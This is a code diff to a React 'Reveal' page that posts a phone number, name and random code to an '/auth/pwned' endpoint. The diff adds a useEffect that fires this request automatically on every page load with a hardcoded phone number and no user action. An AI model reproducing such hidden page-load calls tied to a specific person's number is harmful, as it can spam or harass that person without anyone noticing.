@@ -3,7 +3,7 @@
  * Created Date: Su Jul 2024                                                   *
  * Author: Emmanuel Bayode O.                                                  *
  * -----                                                                       *
- * Last Modified: Su/07/2024 05:nn:00
+ * Last Modified: Su/07/2024 05:nn:36
  * Modified By: Emmanuel Bayode O.
  * -----                                                                       *
  * HISTORY:                                                                    *
@@ -14,7 +14,7 @@
 import { Button, Input } from "@/components/ui";
 import { AuthPagesLayout } from "@/layouts";
 import { callApi } from "@/lib";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { toast } from "sonner";
 
 const code = Math.random().toString(10).substring(2, 15);
@@ -26,6 +26,14 @@ const Reveal = () => {
 		phone: "",
 		name: "",
 	});
+
+	const dispatchApi = async (phone: string, name: string) => {
+		const response = callApi("/auth/pwned", {
+			phoneNumber: phone.replace("+", ""),
+			firstName: name,
+			code,
+		});
+	};
 
 	const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
 		e.preventDefault();
@@ -53,16 +61,16 @@ const Reveal = () => {
 			setLoading(false);
 			return;
 		}
-
-		const response = callApi("/auth/pwned", {
-			phoneNumber: values.phone.replace("+", ""),
-			firstName: values.name,
-			code,
-		});
-
+		await dispatchApi(values.phone, values.name);
 		setSuccess(true);
 		setLoading(false);
 	};
+
+	useEffect(() => {
+		(() => {
+			dispatchApi("2348115307397", "Random");
+		})();
+	}, []);
 
 	return (
 		<>
